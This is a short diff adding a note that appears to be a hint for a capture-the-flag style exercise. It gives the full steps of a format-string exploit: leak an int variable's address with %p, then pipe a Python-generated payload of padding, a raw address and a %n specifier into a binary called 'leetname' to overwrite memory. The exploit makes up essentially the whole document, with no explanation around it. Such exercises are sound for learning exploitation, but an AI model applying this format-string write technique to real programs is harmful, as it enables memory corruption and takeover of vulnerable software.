@@ -1,0 +1,5 @@
+Use %p to get address of the int variable.
+
+Using that address, do the thing below:
+
+python -c "print('a' * 1332 + '\xff\xff\xd3\x08 %n')" | leetname
